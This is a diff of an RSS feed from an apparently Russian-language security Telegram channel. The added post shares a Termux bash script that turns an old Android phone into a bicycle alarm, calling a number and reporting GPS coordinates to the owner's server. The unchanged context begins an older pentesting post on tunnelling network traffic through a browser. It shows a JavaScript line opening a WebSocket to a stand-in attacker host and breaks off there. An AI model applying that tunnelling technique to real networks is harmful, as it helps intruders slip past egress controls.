@@ -1,5 +1,29 @@
 <?xml version="1.0" encoding="utf-8"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>s0i37_channel</title><link>https://t.me/s0i37_channel</link><description>none</description><language>ru</language><lastBuildDate>Thu, 30 Apr 2026 07:47:53 +0000</lastBuildDate><item><title>Пробрасываем сетевой туннель сквозь браузер.</title><link>https://t.me/s0i37_channel/269</link><description>Пробрасываем сетевой туннель сквозь браузер.
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>s0i37_channel</title><link>https://t.me/s0i37_channel</link><description>none</description><language>ru</language><lastBuildDate>Mon, 01 Jun 2026 11:00:22 +0000</lastBuildDate><item><title>Первый день лета, начало велосезона, а значит время ежегодной рубрики "находим применение termux в реальной жизни".</title><link>https://t.me/s0i37_channel/270</link><description>Первый день лета, начало велосезона, а значит время ежегодной рубрики "находим применение termux в реальной жизни".
+В прошлом году я писал про велосипедную сигнализацию из старого Android-телефона (https://t.me/s0i37_channel/226). Суть заключалась в bash скрипте который непрерывно читает значение датчика ускорения и если оно больше 1G, то велосипед пришёл в движение и в качестве сигнала совершается телефонный звонок на указанный номер.
+Termux позволяет сделать ещё много чего, и теперь я добавил возможность трансляции геопозиции в режиме реального времени если срабатывает тревога:
+#!/bin/bash
+WAIT=30
+UPDATE=100
+THRESOLD=1100
+NUMBER=89007654321
+RECALL=60
+LOCATION='http://vds'
+INTERVAL=5
+sleep $WAIT
+rm call.lock 2&gt;/dev/null; rm geo.lock 2&gt;/dev/null
+termux-sensor -c
+termux-sensor -s ACCELEROMETER -d $UPDATE | stdbuf -i0 -o0 jq '.ACCELEROMETER.values[]' | stdbuf -i0 -o0 paste - - - | python -c 'while True: a,b,c=input().split(); print(int((abs(float(a))**2+abs(float(b))**2+abs(float(c))**2)**0.5*100))' 2&gt; /dev/null | while read accel
+do echo $accel
+if [ $accel -gt $THRESOLD ]; then
+{ [ -f call.lock ] &amp;&amp; exit; touch call.lock; termux-telephony-call $NUMBER; sleep $RECALL; rm call.lock; } &amp;
+{ [ -f geo.lock ] &amp;&amp; exit; touch geo.lock; while sleep $INTERVAL; do coords=(`termux-location -p gps -r last | jq -e '.latitude//empty,.longitude//empty' || termux-location -p network -r once | jq -e '.latitude//empty,.longitude//empty'`); bat=`termux-battery-status | jq '.percentage'`; curl -s "$LOCATION/?dev=bike&amp;bat=$bat&amp;lat=${coords[0]}&amp;lon=${coords[1]}"; done; } &amp;
+fi
+done
+Взависимости от ситуации скрипт пытается получить координаты по GPS, в случае неудачи координаты берутся на основании наземных источников сигналов.
+pkg install termux-api python jq
+
+[Media: Фото]</description><pubDate>Mon, 01 Jun 2026 11:00:22 +0000</pubDate><guid isPermaLink="false">telegram_s0i37_channel_270</guid></item><item><title>Пробрасываем сетевой туннель сквозь браузер.</title><link>https://t.me/s0i37_channel/269</link><description>Пробрасываем сетевой туннель сквозь браузер.
 При пентесте бывает так что из локальной сети наружу разрешён только трафик браузера.
 С помощью следующего js-кода мы можем открыть два веб-сокета - один на опорный сервер, другой на локальное приложение, после чего связать их:
 var external = new WebSocket("ws://attcker_vds:80")
